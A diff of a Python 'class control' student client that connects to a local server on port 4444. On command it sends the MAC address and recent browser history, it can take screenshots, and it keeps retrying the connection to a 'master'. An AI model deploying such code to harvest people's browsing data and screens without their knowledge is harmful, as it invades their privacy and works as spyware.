@@ -1,4 +1,5 @@
 # CLASS CONTROL APP - CLIENT SIDE (STUDENTS)
+# TODO:: check if connection still maintained
 from getmac import get_mac_address
 from browser_history import get_history
 from PIL import ImageGrab
@@ -16,6 +17,8 @@ IP_ADDRESS = "127.0.0.1"
 PLATFORM = {"system": plt.system(), "release": plt.release(), "version": plt.version()}
 
 class CCA_CLIENT:
+
+
     def __init__(self, host, port):
         self.host = host
         self.port = port
@@ -26,6 +29,7 @@ class CCA_CLIENT:
         sock.connect((self.host, self.port))
         sending = socket.gethostbyname(socket.gethostname())
         sock.send(sending.encode())
+        print(f"[*] Connected to host: {self.host}:{self.port}")
 
     def execute(self):
         while True:
@@ -35,8 +39,7 @@ class CCA_CLIENT:
                 sock.send(MAC_ADDRESS.encode())
 
             elif command == "bhistory":
-                hist = self.getHistory()
-                sock.send(hist)
+                sock.send(self.getHistory())
 
             elif command == "exit":
                 sock.send(b"exit")
@@ -50,21 +53,26 @@ class CCA_CLIENT:
         b_history = get_history()
         b_history = b_history.histories  # [(date/url),]
         b_history = b_history[len(b_history) - 20 : len(b_history)]
-        f = lambda p : (datetime.timestamp(p[0]), p[1])
+        f = lambda p: (datetime.timestamp(p[0]), p[1])
         b_history = dict(map(f, b_history))
 
         return pickle.dumps(b_history)
 
-    # def getScreenshot():
-    #     screenshot = ImageGrab.grab()
-    #     save_path = os.path.join(__location__, f"scrn/{MAC_ADD}_{getTS()}.jpg")
-    #     screenshot.save(save_path)
-    #     screenshot.show()
-    #     return save_path
+    def getScreenshot(self):
+        screenshot = ImageGrab.grab()
+        save_path = os.path.join(LOCATION, f"scrn/{MAC_ADDRESS}_{self.getTS()}.jpg")
+        screenshot.save(save_path)
+        screenshot.show()
+        return save_path
 
 
 client = CCA_CLIENT("127.0.0.1", 4444)
 
 if __name__ == "__main__":
-    client.start_connection()
-    client.execute()
+    while True:
+        try:
+            client.start_connection()
+            client.execute()
+        except:
+            print("[*] Looking for master!")
+        time.sleep(2)
